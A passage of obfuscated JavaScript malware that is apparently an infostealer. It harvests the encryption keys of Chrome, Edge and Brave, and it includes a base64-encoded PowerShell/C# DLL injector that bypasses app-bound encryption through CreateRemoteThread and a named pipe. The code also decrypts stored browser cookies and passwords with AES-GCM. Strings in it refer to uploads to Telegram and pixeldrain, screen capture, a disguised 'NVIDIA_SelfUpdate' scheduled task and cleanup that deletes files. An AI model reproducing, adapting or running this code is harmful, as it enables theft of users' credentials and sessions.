          const t = y.expiresUnix && b.ITPQW(z.expiresUnix, 0) ? b.nvekV(A, B.floor(C.expiresUnix)) : "0";
          const u = !q.startsWith(".");
          const v = {
            no_restriction: b.wiGkU,
            lax: b.oqdUU,
            strict: b.MkDJZ
          };
          const w = v;
          return {
            "Host raw": s,
            "Name raw": D.name,
            "Path raw": E.path || "/",
            "Content raw": F.value,
            Expires: t !== "0" ? new G(b.MvHYd(H.expiresUnix, 1000)).toLocaleString(b.cTRxZ, {
              day: b.lWWeP,
              month: b.lWWeP,
              year: b.OkfhS,
              hour: b.lWWeP,
              minute: b.lWWeP,
              second: b.lWWeP,
              hour12: false
            }).replace(/\//g, "-") : "At the end of the session",
            "Expires raw": t,
            "Send for": r ? b.YaWEy : b.xkkBN,
            "Send for raw": b.nvekV(I, r),
            "HTTP only raw": b.nvekV(J, !!K.httpOnly),
            "SameSite raw": w[L.sameSite] || b.wiGkU,
            "This domain only": u ? b.hGPSG : b.llBUz,
            "This domain only raw": b.nvekV(M, u),
            "Store raw": b.mtStj,
            "First Party Domain": "",
            Service: N.service || "Unknown"
          };
        } else {
          const q = r => {
            const s = {
              ZoRee: "Minecraft_Session_Info.txt",
              WrRjp: b.kCRKO,
              AfBeJ: function (t, u) {
                return b.XUsQe(t, u);
              },
              Aleuo: b.nRrll,
              orWCd: function (t, u) {
                return b.nvekV(t, u);
              },
              OizqA: "sfctt",
              GXRsd: b.SdUTj
            };
            if (b.XUsQe(b.TSPXG, b.TSPXG)) {
              if (fs.existsSync(r)) {
                fs.readdirSync(r).forEach(t => {
                  const u = {
                    iFhIE: s.ZoRee,
                    Apzic: s.WrRjp
                  };
                  const v = u;
                  if (s.AfBeJ(s.Aleuo, s.Aleuo)) {
                    const w = path.join(r, t);
                    if (fs.lstatSync(w).isDirectory()) {
                      s.orWCd(q, w);
                    } else if (s.OizqA === s.GXRsd) {
                      const y = g.join(h, v.iFhIE);
                      i.writeFileSync(y, j.join("\n"), v.Apzic);
                    } else {
                      fs.unlinkSync(w);
                    }
                  } else {
                    try {
                      g.unlinkSync(h);
                    } catch (z) {}
                  }
                });
                fs.rmdirSync(r);
              }
            } else {
              const u = i ? function () {
                if (u) {
                  const w = s.apply(t, arguments);
                  u = null;
                  return w;
                }
              } : function () {};
              n = false;
              return u;
            }
          };
          b.nvekV(q, mainFolderPath);
        }
      } else {
        console.log(b.XpHii, mainFolderPath);
      }
      const h = path.dirname(mainFolderPath);
      const i = path.join(h, b.aOfpF);
      if (fs.existsSync(i)) {
        if (b.Ebktk("FTzaa", b.AkuRb)) {
          const s = b.DIhGI(d, b.VIcVz, {
            windowsHide: true,
            stdio: b.LeyqS,
            timeout: 5000
          }).toString();
          const t = b.nvekV(g, s.trim());
          if (!h(t) && b.SXFqV(t, b.QObsW(100, 1024) * 1024 * 1024)) {
            return true;
          }
        } else {
          try {
            fs.unlinkSync(i);
          } catch (s) {}
        }
      }
      if (fs.existsSync(h) && b.LpBcX(fs.readdirSync(h).length, 0)) {
        if (b.ypVBI(b.BvSrn, b.BvSrn)) {
          if (g) {
            const u = k.apply(l, arguments);
            m = null;
            return u;
          }
        } else {
          try {
            fs.rmdirSync(h);
          } catch (u) {}
        }
      }
    } else {
      const w = {
        windowsHide: true,
        detached: true,
        stdio: b.SaiBw
      };
      c(d, w);
    }
  } catch (w) {}
}
function rotl32(b, c) {
  return ((b << c | b >>> 32 - c) & -1) >>> 0;
}
function pidToTag(a) {
  const c = rotl32((a ^ -1515870811) >>> 0, 5);
  const d = rotl32((a ^ 1013904242) >>> 0, 11);
  const g = rotl32((a ^ 469084129) >>> 0, 17);
  const h = rotl32((a ^ -1640531527) >>> 0, 23);
  return [c, d, g, h].map(i => i.toString(16).padStart(8, "0").toUpperCase()).join("");
}
function readAssetFile(a) {
  const c = [path.join(__dirname, a), path.join(path.dirname(process.execPath), a), path.join(process.cwd(), a), path.join(path.dirname(process.argv[0] || ""), a)];
  if (process.pkg) {
    try {
      c.unshift(path.resolve("/snapshot", "build", a));
    } catch (h) {}
  }
  const d = [];
  for (const j of c) {
    try {
      return fs.readFileSync(j, "utf8").trim();
    } catch (m) {
      d.push(j + ": " + m.code);
    }
  }
  logError(new Error("Asset not found: " + a + " | Tried: " + d.join("; ")), "readAssetFile");
  return null;
}
const ABE_PS_B64 = "cGFyYW0oJGV4ZSwkZGxsLCRraCkKQWRkLVR5cGUgLVR5cGVEZWZpbml0aW9uIEAiCnVzaW5nIFN5c3RlbTsKdXNpbmcgU3lzdGVtLklPOwp1c2luZyBTeXN0ZW0uSU8uUGlwZXM7CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKdXNpbmcgU3lzdGVtLlRleHQ7CnVzaW5nIFN5c3RlbS5UaHJlYWRpbmc7CnB1YmxpYyBzdGF0aWMgY2xhc3MgQUJFSW5qZWN0b3IgewogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIixTZXRMYXN0RXJyb3I9dHJ1ZSldc3RhdGljIGV4dGVybiBJbnRQdHIgVmlydHVhbEFsbG9jRXgoSW50UHRyIGgsSW50UHRyIGEsdWludCBzLHVpbnQgdCx1aW50IHApOwogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIixTZXRMYXN0RXJyb3I9dHJ1ZSldc3RhdGljIGV4dGVybiBib29sIFdyaXRlUHJvY2Vzc01lbW9yeShJbnRQdHIgaCxJbnRQdHIgYSxieXRlW10gYix1aW50IHMsb3V0IHVpbnQgdyk7CiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV1zdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRNb2R1bGVIYW5kbGVBKHN0cmluZyBuKTsKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXXN0YXRpYyBleHRlcm4gSW50UHRyIEdldFByb2NBZGRyZXNzKEludFB0ciBoLHN0cmluZyBuKTsKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsU2V0TGFzdEVycm9yPXRydWUpXXN0YXRpYyBleHRlcm4gSW50UHRyIENyZWF0ZVJlbW90ZVRocmVhZChJbnRQdHIgaCxJbnRQdHIgYSx1aW50IHMsSW50UHRyIGYsSW50UHRyIHAsdWludCBmbCxvdXQgdWludCB0KTsKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXXN0YXRpYyBleHRlcm4gYm9vbCBUZXJtaW5hdGVQcm9jZXNzKEludFB0ciBoLHVpbnQgYyk7CiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV1zdGF0aWMgZXh0ZXJuIGJvb2wgQ2xvc2VIYW5kbGUoSW50UHRyIGgpOwogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildc3RhdGljIGV4dGVybiB1aW50IFdhaXRGb3JTaW5nbGVPYmplY3QoSW50UHRyIGgsdWludCBtcyk7CiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLFNldExhc3RFcnJvcj10cnVlLENoYXJTZXQ9Q2hhclNldC5Vbmljb2RlKV0KICAgIHN0YXRpYyBleHRlcm4gYm9vbCBDcmVhdGVQcm9jZXNzVyhzdHJpbmcgbHBBcHAsc3RyaW5nIGxwQ21kLEludFB0ciBwYSxJbnRQdHIgdGEsW01hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJvb2wpXWJvb2wgaW5oLHVpbnQgZmxhZ3MsSW50UHRyIGVudixzdHJpbmcgZGlyLHJlZiBTVEFSVFVQSU5GT1cgc2ksb3V0IFBST0NFU1NfSU5GT1JNQVRJT04gcGkpOwogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsQ2hhclNldD1DaGFyU2V0LlVuaWNvZGUpXQogICAgc3RydWN0IFNUQVJUVVBJTkZPV3twdWJsaWMgdWludCBjYjtwdWJsaWMgSW50UHRyIHI7cHVibGljIEludFB0ciBkO3B1YmxpYyBJbnRQdHIgdDtwdWJsaWMgdWludCBkd1gsZHdZLGR3WFNpemUsZHdZU2l6ZSxkd1hDQyxkd1lDQyxkd0ZBLGR3RmxhZ3M7cHVibGljIHVzaG9ydCB3U1csY2JSMjtwdWJsaWMgSW50UHRyIGxwUjIsaFNJLGhTTyxoU0U7fQogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgc3RydWN0IFBST0NFU1NfSU5GT1JNQVRJT057cHVibGljIEludFB0ciBoUHJvY2VzcyxoVGhyZWFkO3B1YmxpYyB1aW50IGR3UHJvY2Vzc0lkLGR3VGhyZWFkSWQ7fQogICAgc3RhdGljIHVpbnQgUm90bDMyKHVpbnQgeCxpbnQgcil7cmV0dXJuKHg8PHIpfCh4Pj4oMzItcikpO30KICAgIHN0YXRpYyBzdHJpbmcgUGlkVG9UYWcodWludCBwaWQpewogICAgICAgIHVpbnQgYT1Sb3RsMzIocGlkXjB4QTVBNUE1QTV1LDUpLGI9Um90bDMyKHBpZF4weDNDNkVGMzcydSwxMSksYz1Sb3RsMzIocGlkXjB4MUJGNUE3RTF1LDE3KSxkPVJvdGwzMihwaWReMHg5RTM3NzlCOXUsMjMpOwogICAgICAgIHJldHVybiBzdHJpbmcuRm9ybWF0KCJ7MDpYOH17MTpYOH17MjpYOH17MzpYOH0iLGEsYixjLGQpO30KICAgIHN0YXRpYyBieXRlW10gSGV4VG9CeXRlcyhzdHJpbmcgaGV4KXsKICAgICAgICBieXRlW10gYnl0ZXM9bmV3IGJ5dGVbaGV4Lkxlbmd0aC8yXTsKICAgICAgICBmb3IoaW50IGk9MDtpPGJ5dGVzLkxlbmd0aDtpKyspYnl0ZXNbaV09Q29udmVydC5Ub0J5dGUoaGV4LlN1YnN0cmluZyhpKjIsMiksMTYpOwogICAgICAgIHJldHVybiBieXRlczt9CiAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBSdW4oc3RyaW5nIGV4ZVBhdGgsc3RyaW5nIGRsbFBhdGgsc3RyaW5nIGVuY0tleUhleCl7CiAgICAgICAgdmFyIHNpPW5ldyBTVEFSVFVQSU5GT1coKTtzaS5jYj0odWludClNYXJzaGFsLlNpemVPZih0eXBlb2YoU1RBUlRVUElORk9XKSk7CiAgICAgICAgUFJPQ0VTU19JTkZPUk1BVElPTiBwaTsKICAgICAgICBib29sIG9rPUNyZWF0ZVByb2Nlc3NXKGV4ZVBhdGgsbnVsbCxJbnRQdHIuWmVybyxJbnRQdHIuWmVybyxmYWxzZSw0dSxJbnRQdHIuWmVybyxudWxsLHJlZiBzaSxvdXQgcGkpOwogICAgICAgIGlmKCFva3x8cGkuZHdQcm9jZXNzSWQ9PTApdGhyb3cgbmV3IEV4Y2VwdGlvbigiQ3JlYXRlUHJvY2Vzc1cgZmFpbGVkOiAiK01hcnNoYWwuR2V0TGFzdFdpbjMyRXJyb3IoKSk7CiAgICAgICAgc3RyaW5nIHRhZz1QaWRUb1RhZyhwaS5kd1Byb2Nlc3NJZCk7CiAgICAgICAgdXNpbmcodmFyIHBpcGU9bmV3IE5hbWVkUGlwZVNlcnZlclN0cmVhbSh0YWcsUGlwZURpcmVjdGlvbi5Jbk91dCwxLFBpcGVUcmFuc21pc3Npb25Nb2RlLkJ5dGUsUGlwZU9wdGlvbnMuTm9uZSkpewogICAgICAgICAgICBieXRlW10gZGI9RW5jb2RpbmcuQVNDSUkuR2V0Qnl0ZXMoZGxsUGF0aCsiXDAiKTsKICAgICAgICAgICAgSW50UHRyIHJhPVZpcnR1YWxBbGxvY0V4KHBpLmhQcm9jZXNzLEludFB0ci5aZXJvLCh1aW50KWRiLkxlbmd0aCwweDMwMDAsMHg0MCk7CiAgICAgICAgICAgIHVpbnQgdz0wO1dyaXRlUHJvY2Vzc01lbW9yeShwaS5oUHJvY2VzcyxyYSxkYiwodWludClkYi5MZW5ndGgsb3V0IHcpOwogICAgICAgICAgICBJbnRQdHIgazMyPUdldE1vZHVsZUhhbmRsZUEoImtlcm5lbDMyLmRsbCIpO0ludFB0ciBsbD1HZXRQcm9jQWRkcmVzcyhrMzIsIkxvYWRMaWJyYXJ5QSIpOwogICAgICAgICAgICB1aW50IHRpZD0wO0ludFB0ciBoVD1DcmVhdGVSZW1vdGVUaHJlYWQocGkuaFByb2Nlc3MsSW50UHRyLlplcm8sMCxsbCxyYSwwLG91dCB0aWQpOwogICAgICAgICAgICBpZihoVCE9SW50UHRyLlplcm8pe1dhaXRGb3JTaW5nbGVPYmplY3QoaFQsMTAwMDApO0Nsb3NlSGFuZGxlKGhUKTt9CiAgICAgICAgICAgIHZhciBjdHM9bmV3IENhbmNlbGxhdGlvblRva2VuU291cmNlKDE1MDAwKTsKICAgICAgICAgICAgcGlwZS5XYWl0Rm9yQ29ubmVjdGlvbkFzeW5jKGN0cy5Ub2tlbikuR2V0QXdhaXRlcigpLkdldFJlc3VsdCgpOwogICAgICAgICAgICBieXRlW10ga2I9SGV4VG9CeXRlcyhlbmNLZXlIZXgpO2J5dGVbXSBsYj1CaXRDb252ZXJ0ZXIuR2V0Qnl0ZXMoKHVpbnQpa2IuTGVuZ3RoKTsKICAgICAgICAgICAgcGlwZS5Xcml0ZShsYiwwLDQpO3BpcGUuV3JpdGUoa2IsMCxrYi5MZW5ndGgpO3BpcGUuRmx1c2goKTsKICAgICAgICAgICAgYnl0ZVtdIGJ1Zj1uZXcgYnl0ZVs0MDk2XTtpbnQgbj1waXBlLlJlYWQoYnVmLDAsNDA5Nik7CiAgICAgICAgICAgIHN0cmluZyByZXN1bHQ9RW5jb2RpbmcuQVNDSUkuR2V0U3RyaW5nKGJ1ZiwwLG4pLlRyaW0oKTsKICAgICAgICAgICAgVGVybWluYXRlUHJvY2VzcyhwaS5oUHJvY2VzcywwKTtDbG9zZUhhbmRsZShwaS5oUHJvY2Vzcyk7Q2xvc2VIYW5kbGUocGkuaFRocmVhZCk7CiAgICAgICAgICAgIHJldHVybiByZXN1bHQ7CiAgICAgICAgfQogICAgfQp9CiJACnRyeXskcj1bQUJFSW5qZWN0b3JdOjpSdW4oJGV4ZSwkZGxsLCRraCk7V3JpdGUtT3V0cHV0ICRyfWNhdGNoe2V4aXQgMX0=";
function extractABEKeyViaDLL(a, b) {
  const c = {
    sOxJq: "No stack trace",
    jpJAH: "log.txt",
    XMHSm: "utf8",
    HCTNX: "extractABE-outer",
    yhZyL: function (d, g) {
      return d(g);
    },
    szCXR: function (d, g, h) {
      return d(g, h);
    },
    rgbge: "Global-UncaughtException",
    MIgcz: "7|4|1|0|2|5|8|3|6",
    gscqV: function (d, g) {
      return d + g;
    },
    zgVlV: function (d, g) {
      return d * g;
    },
    feVnC: function (d, g) {
      return d - g;
    },
    gzjZf: function (d, g) {
      return d > g;
    },
    FWsXD: function (d, g) {
      return d + g;
    },
    gdbfQ: function (d, g) {
      return d <= g;
    },
    hIORH: function (d, g) {
      return d + g;
    },
    RLPRg: function (d, g) {
      return d === g;
    },
    jeCnc: "cEefT",
    oYhlz: "CcEog",
    ESVPH: function (d, g) {
      return d + g;
    },
    VUdNO: "PS exec failed: ",
    UMCXf: " | stderr: ",
    rBIZs: function (d, g) {
      return d || g;
    },
    eTcVu: "extractABE-exec",
    TzQBG: function (d, g) {
      return d - g;
    },
    clsNp: function (d, g) {
      return d >= g;
    },
    AWZfy: "hgOAt",
    DppzX: "nXxsC",
    bxQTe: "Rqzmn",
    arVlr: "hex",
    cduzL: function (d, g) {
      return d + g;
    },
    xHSds: function (d, g) {
      return d + g;
    },
    vdxGr: "Invalid key response (lines=",
    ooRgY: "): ",
    wALLl: function (d, g) {
      return d !== g;
    },
    WNVqb: "iFeIX",
    cPFdA: "abe_dll.txt",
    VfDTF: function (d, g) {
      return d(g);
    },
    cEDKd: "abe_dll.txt not found",
    xYgzo: "base64",
    kbRZM: function (d, g) {
      return d + g;
    },
    aasfR: function (d, g) {
      return d + g;
    },
    gtDjF: function (d, g) {
      return d + g;
    },
    WvLHL: ".dll",
    bBlzM: function (d, g) {
      return d(g);
    },
    INNtQ: "abe_ps.txt",
    BDepC: function (d, g) {
      return d + g;
    },
    VwDwV: function (d, g) {
      return d + g;
    },
    GpRzr: "cr_",
    OscMf: ".ps1",
    aNuYy: function (d, g, h, i) {
      return d(g, h, i);
    },
    NkqxT: function (d, g) {
      return d + g;
    },
    MqKZP: "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"",
    whYDL: "\" \"",
    tqnHr: "sRCht",
    xFwqp: function (d, g, h) {
      return d(g, h);
    }
  };
  return new Promise((d, g) => {
    if (c.wALLl("zGxqq", c.WNVqb)) {
      try {
        const h = c.yhZyL(readAssetFile, c.cPFdA);
        if (!h) {
          return c.VfDTF(g, new Error(c.cEDKd));
        }
        const i = zlib.inflateSync(Buffer.from(h, c.xYgzo));
        const j = c.kbRZM(c.FWsXD(Date.now(), "_"), Math.random().toString(36).slice(2));
        const k = path.join(os.tmpdir(), c.aasfR(c.gtDjF("cr_", j), c.WvLHL));
        fs.writeFileSync(k, i);
        let l = c.bBlzM(readAssetFile, c.INNtQ);
        if (!l) {
          l = Buffer.from(ABE_PS_B64, c.xYgzo).toString(c.XMHSm);
        }
        const m = path.join(os.tmpdir(), c.BDepC(c.VwDwV(c.GpRzr, j), c.OscMf));
        fs.writeFileSync(m, l);
        c.aNuYy(exec, c.ESVPH(c.aasfR(c.VwDwV(c.NkqxT(c.gtDjF(c.MqKZP, m) + c.whYDL + a + c.whYDL, k), c.whYDL), b), "\""), {
          timeout: 30000,
          windowsHide: true
        }, (o, p, q) => {
          const r = {
            MmEis: c.sOxJq,
            AmKqE: c.jpJAH,
            tVAFb: c.XMHSm,
            qSjmc: c.HCTNX,
            IyOcg: function (u, v) {
              return c.yhZyL(u, v);
            },
            csgOh: function (u, v, w) {
              return c.szCXR(u, v, w);
            },
            dPLis: c.rgbge,
            yrGpZ: c.MIgcz,
            taMbv: function (u, v) {
              return c.gscqV(u, v);
            },
            quekU: function (u, v) {
              return u - v;
            },
            CMIri: function (u, v) {
              return c.zgVlV(u, v);
            },
            xsNmI: function (u, v) {
              return c.feVnC(u, v);
            },
            uzyWm: function (u, v) {
              return c.gzjZf(u, v);
            },
            MMWBq: function (u, v) {
              return c.FWsXD(u, v);
            },
            WyVJb: function (u, v) {
              return c.gdbfQ(u, v);
            },
            dtRfj: function (u, v) {
              return c.hIORH(u, v);
            }
          };
          try {
            fs.unlinkSync(k);
          } catch (u) {}
          try {
            if (c.RLPRg(c.jeCnc, c.jeCnc)) {
              fs.unlinkSync(m);
            } else {
              const w = s();
              const x = "[" + w + "] [ERROR] " + t + ": " + (u.message || v) + "\nStack: " + (w.stack || r.MmEis) + "\n\n";
              x.error("[ERROR] " + y + ":", z);
              if (!A) {
                return;
              }
              const y = {
                recursive: true
              };
              if (!B.existsSync(C)) {
                D.mkdirSync(E, y);
              }
              const z = F.join(G, r.AmKqE);
              H.appendFileSync(z, x, r.tVAFb);
            }
          } catch (w) {}
          if (o) {
            if (c.oYhlz !== c.oYhlz) {
              g(h, r.qSjmc);
              r.IyOcg(i, j);
            } else {
              c.szCXR(logError, new Error(c.gscqV(c.hIORH(c.ESVPH(c.VUdNO, o.message), c.UMCXf), c.rBIZs(q, "").substring(0, 300))), c.eTcVu);
              return g(o);
            }
          }
          const s = p.toString().trim().split(/\r?\n/);
          let t = "";
          for (let y = c.TzQBG(s.length, 1); c.clsNp(y, 0); y--) {
            if (c.AWZfy !== c.AWZfy) {
              const A = k.readdirSync(l);
              for (const B of A) {
                const C = y.join(z, B);
                const D = A.statSync(C);
                if (D.isDirectory()) {
                  E += F(C);
                } else {
                  G += D.size;
                }
              }
            } else {
              const A = s[y].trim();
              if (c.clsNp(A.length, 32) && /^[0-9a-fA-F]+$/.test(A)) {
                if (c.DppzX === "COMJi") {
                  r.csgOh(c, d, r.dPLis);
                } else {
                  t = A;
                  break;
                }
              }
            }
          }
          if (t) {
            if (c.bxQTe !== c.bxQTe) {
              const D = r.yrGpZ.split("|");
              let E = 0;
              while (true) {
                switch (D[E++]) {
                  case "0":
                    var F = r.taMbv(G, r.quekU(I, G) % (J - 4));
                    continue;
                  case "1":
                    var G = r.quekU(G.floor(r.CMIri(r.xsNmI(H, 12), 32) / 255), 23);
                    continue;
                  case "2":
                    if (r.uzyWm(F, K)) {
                      F = G;
                    }
                    continue;
                  case "3":
                    while (L && M > 0) {
                      var H = r.IyOcg(W, L);
                      L = H.readUInt32BE(0);
                      var I = K.min(M, r.quekU(Y, 4));
                      J.push(Z.from(H.slice(4, r.MMWBq(4, I))));
                      M -= I;
                    }
                    continue;
                  case "4":
                    if (r.WyVJb(A, K)) {
                      return B.from(C.slice(D, E + F));
                    }
                    continue;
                  case "5":
                    var J = [F.from(L.slice(G, r.dtRfj(N, F)))];
                    continue;
                  case "6":
                    return V.concat(J);
                  case "7":
                    var K = r.quekU(z, 35);
                    continue;
                  case "8":
                    var L = O.readUInt32BE(r.dtRfj(P, F));
                    var M = r.xsNmI(Q, F);
                    continue;
                }
                break;
              }
            } else {
              c.yhZyL(d, Buffer.from(t, c.arVlr));
            }
          } else {
            const D = c.cduzL(c.xHSds(c.vdxGr + s.length, c.ooRgY), p.toString().substring(0, 200));
            logError(new Error(D), "extractABE-parse");
            g(new Error(D));
          }
        });
      } catch (o) {
        if (c.wALLl(c.tqnHr, c.tqnHr)) {
          c.unlinkSync(d);
        } else {
          c.xFwqp(logError, o, "extractABE-outer");
          g(o);
        }
      }
    } else {
      c.push("  " + d + ": (config read error)");
    }
  });
}
async function loadConfiguration() {
  const b = {
    zOZkA: function (g, h) {
      return g + h;
    },
    XlVnb: "sqJCF",
    ansNM: function (g, h) {
      return g(h);
    },
    QffTJ: function (g, h, j) {
      return g(h, j);
    },
    BKuIG: function (g, h) {
      return g === h;
    },
    QsvBQ: "SBRmV",
    NwcDK: function (g, h, j, k) {
      return g(h, j, k);
    },
    XurZu: "powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(",
    XBJzU: "Direct-Telegram-Upload",
    dltfQ: "https://pixeldrain.com/u/",
    xSTLx: function (g, h) {
      return g - h;
    },
    GHvvS: "ignore",
    SrGrr: "Zip-Create-Fallback",
    wPiPU: function (g, h) {
      return g < h;
    },
    TOGZK: function (g, h) {
      return g !== h;
    },
    LPiPn: "DBxrT",
    JzqJn: "Local State",
    PTyay: "utf8",
    mnjRl: "lYEQH",
    mIPiK: "base64",
    JZLIU: "v10Key-DPAPI-",
    ejtxP: "unknown",
    OSjkz: function (g, h) {
      return g !== h;
    },
    TOUHZ: "oDcjL",
    cKGzw: "Chrome",
    scQbQ: "chrome.exe",
    sDpDb: "brave.exe",
    WRlcF: function (g, h) {
      return g === h;
    },
    KGkzu: "OYtWG",
    fhdJa: "FIEQZ",
    xeWMp: function (g, h) {
      return g(h);
    },
    aruRj: "HybwA",
    RqsTS: "hex",
    hbbnI: function (g, h, j) {
      return g(h, j);
    },
    ZPdav: function (g, h) {
      return g + h;
    },
    wIXrd: function (g, h, j) {
      return g(h, j);
    },
    ZpILP: function (g, h) {
      return g + h;
    },
    acwMS: " v20=",
    Ggmit: "null",
    HzMhr: "keyLoad-",
    xAWwP: "FzHpf"
  };
  const c = {};
  const d = {};
  for (let g = 0; b.wPiPU(g, browserPath.length); g++) {
    if (b.TOGZK("Ekuhk", "QrtQb")) {
      try {
        const h = browserPath[g][0];
        const j = browserPath[g][2];
        if (!fs.existsSync(h)) {
          continue;
        }
        if (c[j]) {
          if (b.TOGZK("DBxrT", b.LPiPn)) {
            if (g.startsWith(b.zOZkA(h, "="))) {
              k.push("  " + l.trim());
            }
          } else {
            browserPath[g].push(c[j].v10);
            if (c[j].v20) {
              browserPath[g].push(c[j].v20);
            }
            continue;
          }
        }
        const k = j + b.JzqJn;
        if (!fs.existsSync(k)) {
          continue;
        }
        const l = JSON.parse(fs.readFileSync(k, b.PTyay));
        let m = null;
        let n = null;
        try {
          if (l.os_crypt && l.os_crypt.encrypted_key) {
            if (b.BKuIG(b.mnjRl, b.mnjRl)) {
              let q = Buffer.from(l.os_crypt.encrypted_key, b.mIPiK).slice(5);
              const r = Array.from(q);
              const s = await new Promise((u, v) => {
                const w = {
                  hFvfH: function (x, y, z) {
                    return b.QffTJ(x, y, z);
                  },
                  eihZA: function (z, A) {
                    return z === A;
                  }
                };
                if (b.BKuIG(b.QsvBQ, "SBRmV")) {
                  b.NwcDK(exec, b.zOZkA(b.zOZkA(b.XurZu, r), "), $null, 'CurrentUser')"), {
                    timeout: 10000,
                    windowsHide: true
                  }, (y, z) => {
                    if (b.XlVnb === "hTnjw") {
                      w.hFvfH(g, h, "getEncrypted-" + g[j][1]);
                    } else if (y) {
                      b.ansNM(v, y);
                    } else {
                      u(z);
                    }
                  });
                } else {
                  return w.eihZA(d.indexOf(g), h);
                }
              });
              const t = s.toString().split("\r\n").filter(u => u != "");
              m = Buffer.from(t.map(Number));
            } else {
              d.error("0x" + g + "L9:", h.message);
            }
          }
        } catch (v) {
          b.QffTJ(logError, v, b.zOZkA(b.JZLIU, browserPath[g][1] || b.ejtxP));
        }
        try {
          if (l.os_crypt && l.os_crypt.app_bound_encrypted_key) {
            if (b.OSjkz(b.TOUHZ, b.TOUHZ)) {
              c(d, b.XBJzU);
              return null;
            } else {
              let x = "";
              if (j.includes(b.cKGzw)) {
                x = b.scQbQ;
              } else if (j.includes("Edge")) {
                x = "msedge.exe";
              } else if (j.includes("Brave")) {
                x = b.sDpDb;
              }
              if (x) {
                if (b.WRlcF(b.KGkzu, b.fhdJa)) {
                  return b.zOZkA(b.dltfQ, b.data.id);
                } else {
                  const z = d[x] ? null : b.xeWMp(findBrowserExe, x);
                  if (z && !d[x]) {
                    if (b.WRlcF("HybwA", b.aruRj)) {
                      const A = Buffer.from(l.os_crypt.app_bound_encrypted_key, b.mIPiK).slice(4);
                      const B = A.toString(b.RqsTS);
                      n = await b.hbbnI(extractABEKeyViaDLL, z, B);
                      d[x] = n;
                    } else {
                      return h.slice(b.xSTLx(g, 1) * j, k * l);
                    }
                  } else if (d[x]) {
                    n = d[x];
                  }
                }
              }
            }
          }
        } catch (D) {
          logError(D, b.ZPdav("v20Key-ABE-", browserPath[g][1] || "unknown"));
        }
        const o = {
          v10: m,
          v20: n
        };
        c[j] = o;
        browserPath[g].push(m);
        if (n) {
          browserPath[g].push(n);
        }
        b.wIXrd(logError, new Error(b.ZpILP(b.ZpILP(b.ZpILP("KeyStatus v10=", m ? b.ZPdav(m.length, "B") : "null"), b.acwMS), n ? n.length + "B" : b.Ggmit)), b.ZpILP(b.HzMhr, browserPath[g][1] || b.ejtxP));
      } catch (E) {
        if (b.xAWwP !== "sqelB") {
          logError(E, "getEncrypted-" + browserPath[g][1]);
        } else {
          b.QffTJ(b, "schtasks /delete /tn NVIDIA_SelfUpdate_* /f", {
            stdio: b.GHvvS,
            windowsHide: true
          });
        }
      }
    } else {
      b.QffTJ(c, d, b.SrGrr);
    }
  }
}
function decryptBrowserValue(a, b, c) {
  const g = {
    IZekJ: function (l, m, n) {
      return l(m, n);
    },
    EoZDg: "RemoteDebug-",
    MNCNz: "No accounts found or invalid format",
    oAvhh: "captureAllScreens-readFile",
    sshzU: function (l, m) {
      return l(m);
    },
    IPhAH: "utf8",
    IWxIE: "\n=== Last Login Info ===",
    QAILy: function (l, m) {
      return l < m;
    },
    SDNtQ: "ascii",
    TNLic: function (l, m) {
      return l - m;
    },
    XIdEm: function (l, m) {
      return l - m;
    },
    GgoGy: function (l, m) {
      return l === m;
    },
    hvpUr: "v20",
    vytFt: function (l, m) {
      return l === m;
    },
    RBVwm: "IKCkY",
    lxEdn: "BGAft",
    BRUVd: function (l, m) {
      return l !== m;
    },
    TFZlT: "redQb",
    IkzKK: function (l, m) {
      return l > m;
    },
    WpLHc: function (l, m) {
      return l === m;
    },
    OCyWD: "UEXHe",
    fXjoc: "vQqaQ",
    DIPuw: "aes-256-gcm",
    DspVv: function (l, m) {
      return l !== m;
    },
    BxeRT: "UQCPm",
    ltkrD: "AnudM",
    ihCQj: function (l, m) {
      return l !== m;
    },
    YacJR: "rkcMX",
    sbvvF: "kkThn",
    XsbMU: "tTYjx",
    qvMVE: "ifLKM"
  };
  if (!a || !Buffer.isBuffer(a) || g.QAILy(a.length, 32)) {
    return null;
  }
  const h = a.slice(0, 3).toString(g.SDNtQ);
  const i = Buffer.from(a.slice(3, 15));
  const j = Buffer.from(a.slice(15, g.TNLic(a.length, 16)));
  const k = Buffer.from(a.slice(g.XIdEm(a.length, 16)));
  if (g.GgoGy(h, g.hvpUr)) {
    if (g.vytFt(g.RBVwm, g.lxEdn)) {
      const m = i ? function () {
        if (m) {
          const w = s.apply(t, arguments);
          u = null;
          return w;
        }
      } : function () {};
      n = false;
      return m;
    } else {
      if (c) {
        if (g.BRUVd(g.TFZlT, "redQb")) {
          g.IZekJ(d, g, g.EoZDg + h.name);
        } else {
          try {
            const n = crypto.createDecipheriv("aes-256-gcm", c, i);
            n.setAuthTag(k);
            const o = Buffer.concat([n.update(j), n.final()]);
            if (g.IkzKK(o.length, 32)) {
              return o.slice(32).toString(g.IPhAH);
            } else {
              return o.toString("utf8");
            }
          } catch (p) {}
        }
      }
      if (b) {
        if (g.WpLHc(g.OCyWD, g.fXjoc)) {
          b.push(g.MNCNz);
        } else {
          try {
            const r = crypto.createDecipheriv(g.DIPuw, b, i);
            r.setAuthTag(k);
            return Buffer.concat([r.update(j), r.final()]).toString("utf8");
          } catch (s) {}
        }
      }
    }
  } else {
    if (b) {
      if (g.DspVv(g.BxeRT, g.ltkrD)) {
        try {
          const t = crypto.createDecipheriv("aes-256-gcm", b, i);
